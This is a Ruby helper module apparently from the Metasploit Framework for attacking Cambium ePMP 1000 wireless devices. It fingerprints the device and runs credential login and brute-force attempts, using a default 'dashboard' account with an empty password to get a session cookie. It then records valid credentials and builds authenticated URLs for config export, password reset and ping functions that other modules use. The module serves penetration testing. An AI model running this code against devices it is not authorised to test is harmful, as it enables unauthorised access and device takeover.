# -*- coding: binary -*-
module Msf
###
#
# This module provides methods for working with epmp
#
###

module Auxiliary::EPMP
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  #
  # Check if App is Cambium ePMP 1000
  #

  def is_app_epmp1000?
    begin
      res = send_request_cgi(
        {
          'uri'       => '/',
          'method'    => 'GET'
        }
      )
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
      return false
    end

    good_response = (
      res &&
      res.code == 200 &&
      (res.body.include?('cambium.min.css') || res.body.include?('cambiumnetworks.com') && res.body.include?('https://support.cambiumnetworks.com/files/epmp/'))
    )

    if good_response
      get_epmp_ver = res.body.match(/"sw_version">([^<]*)/)
      if !get_epmp_ver.nil?
        epmp_ver = get_epmp_ver[1]
        if !epmp_ver.nil?
          print_good("#{rhost}:#{rport} - Running Cambium ePMP 1000 version #{epmp_ver}...")
          do_login(epmp_ver.to_s)
          return true
        else
          print_good("#{rhost}:#{rport} - Running Cambium ePMP 1000...")
          epmp_ver = ''
          login(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)
          return true
        end
      end
    else
      print_error("#{rhost}:#{rport} - Application does not appear to be Cambium ePMP 1000. Module will not continue.")
      return false
    end
  end

  # run if version > 3.4.1

  def login_2(user, pass, epmp_ver)
    res = send_request_cgi(
      {
        'uri' => '/cgi-bin/luci',
        'method' => 'POST',
        'headers' => {
          'X-Requested-With' => 'XMLHttpRequest',
          'Accept' => 'application/json, text/javascript, */*; q=0.01'
        },
        'vars_post' =>
          {
            'username' => 'dashboard',
            'password' => ''
          }
      }
    )

    cookies = res.get_cookies_parsed
    check_sysauth = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s

    good_response = (
      res &&
      res.code == 200 &&
      check_sysauth.include?('sysauth')
    )

    if good_response
      sysauth_dirty = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s
      sysauth_value = sysauth_dirty.match(/((.*)[$ ])/)
      prevsessid = res.body.match(/((?:[a-z][a-z]*[0-9]+[a-z0-9]*))/)

      res = send_request_cgi(
        {
          'uri' => '/cgi-bin/luci',
          'method' => 'POST',
          'cookie' => sysauth_value,
          'headers' => {
            'X-Requested-With' => 'XMLHttpRequest',
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Connection' => 'close'
          },
          'vars_post' =>
            {
              'username' => user,
              'password' => pass,
              'prevsess' => prevsessid
            }
        }
      )

      good_response = (
        res &&
        res.code == 200 &&
        !res.body.include?('auth_failed')
      )

      if good_response
        print_good("SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
        report_cred(
          ip: rhost,
          port: rport,
          service_name: "Cambium ePMP 1000 version #{epmp_ver}",
          user: user,
          password: pass
        )

        # check if max_user_number_reached?
        if !res.body.include?('max_user_number_reached')
          # get the cookie now
          cookies = res.get_cookies_parsed
          stok_value_dirty = res.body.match(/"stok": "(.*?)"/)
          stok_value = "#{stok_value_dirty}".split('"')[3]
          sysauth_dirty = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s
          sysauth_value = sysauth_dirty.match(/((.*)[$ ])/)

          final_cookie = "#{sysauth_value}" + 'usernameType_80=admin; stok_80=' + stok_value

          # create config_uri for different modules
          config_uri_dump_config = '/cgi-bin/luci/;stok=' + stok_value + '/admin/config_export?opts=json'
          config_uri_reset_pass = '/cgi-bin/luci/;stok=' + stok_value + '/admin/set_param'
          config_uri_get_chart = '/cgi-bin/luci/;stok=' + stok_value + '/admin/get_chart'

          return final_cookie, config_uri_dump_config, config_uri_reset_pass, config_uri_get_chart
        else
          print_error('The credentials are correct but maximum number of logged-in users reached. Try again later.')
          final_cookie = 'skip'
          config_uri_dump_config = 'skip'
          config_uri_reset_pass = 'skip'
          config_uri_get_chart = 'skip'
          return final_cookie, config_uri_dump_config, config_uri_reset_pass, config_uri_get_chart
        end
      else
        print_error("FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
        final_cookie = 'skip'
        config_uri_dump_config = 'skip'
        config_uri_reset_pass = 'skip'
        config_uri_get_chart = 'skip'
        return final_cookie, config_uri_dump_config, config_uri_reset_pass, config_uri_get_chart
      end
    end
  end

  # run if version < 3.4.1
  def login_1(user, pass, epmp_ver)
    res = send_request_cgi(
      {
        'uri' => '/cgi-bin/luci',
        'method' => 'POST',
        'headers' => {
          'X-Requested-With' => 'XMLHttpRequest',
          'Accept' => 'application/json, text/javascript, */*; q=0.01'
        },
        'vars_post' =>
          {
            'username' => 'dashboard',
            'password' => ''
          }
      }
    )

    cookies = res.get_cookies_parsed
    check_sysauth = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s

    good_response = (
      res &&
      res.code == 200 &&
      check_sysauth.include?('sysauth')
    )

    if good_response
      sysauth_dirty = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s
      sysauth_value = sysauth_dirty.match(/((.*)[$ ])/)

      cookie1 = "#{sysauth_value}" + "globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D"

      res = send_request_cgi(
        {
          'uri' => '/cgi-bin/luci',
          'method' => 'POST',
          'cookie' => cookie1,
          'headers' => {
            'X-Requested-With' => 'XMLHttpRequest',
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Connection' => 'close'
          },
          'vars_post' =>
            {
              'username' => user,
              'password' => pass
            }
        }
      )

      cookies = res.get_cookies_parsed

      good_response = (
        res &&
        res.code == 200 &&
        !res.body.include?('auth_failed')
      )

      if good_response
        print_good("SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
        report_cred(
          ip: rhost,
          port: rport,
          service_name: "Cambium ePMP 1000 version #{epmp_ver}",
          user: user,
          password: pass
        )

        # check if max_user_number_reached?
        if !res.body.include?('max_user_number_reached')
        # get the final cookie now
          cookies = res.get_cookies_parsed
          stok_value = cookies.has_key?('stok') && cookies['stok'].first
          sysauth_dirty = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s
          sysauth_value = sysauth_dirty.match(/((.*)[$ ])/)

          final_cookie = "#{sysauth_value}" + "globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D; userType=Installer; usernameType=installer; stok=" + stok_value

          # create config_uri for different modules
          config_uri_dump_config = '/cgi-bin/luci/;stok=' + stok_value + '/admin/config_export?opts=json'
          config_uri_reset_pass = '/cgi-bin/luci/;stok=' + stok_value + '/admin/set_param'
          config_uri_get_chart = '/cgi-bin/luci/;stok=' + stok_value + '/admin/get_chart'
          config_uri_ping = '/cgi-bin/luci/;stok=' + stok_value + '/admin/ping'

          return final_cookie, config_uri_dump_config, config_uri_reset_pass, config_uri_get_chart, config_uri_ping
        else
          print_error('The credentials are correct but maximum number of logged-in users reached. Try again later.')
          final_cookie = 'skip'
          config_uri_dump_config = 'skip'
          config_uri_reset_pass = 'skip'
          config_uri_get_chart = 'skip'
          config_uri_ping = 'skip'
          return final_cookie, config_uri_dump_config, config_uri_reset_pass, config_uri_get_chart, config_uri_ping
        end
      else
        print_error("FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
        final_cookie = 'skip'
        config_uri_dump_config = 'skip'
        config_uri_reset_pass = 'skip'
        config_uri_get_chart = 'skip'
        config_uri_ping = 'skip'
        return final_cookie, config_uri_dump_config, config_uri_reset_pass, config_uri_get_chart, config_uri_ping
      end
    end
  end
end
end
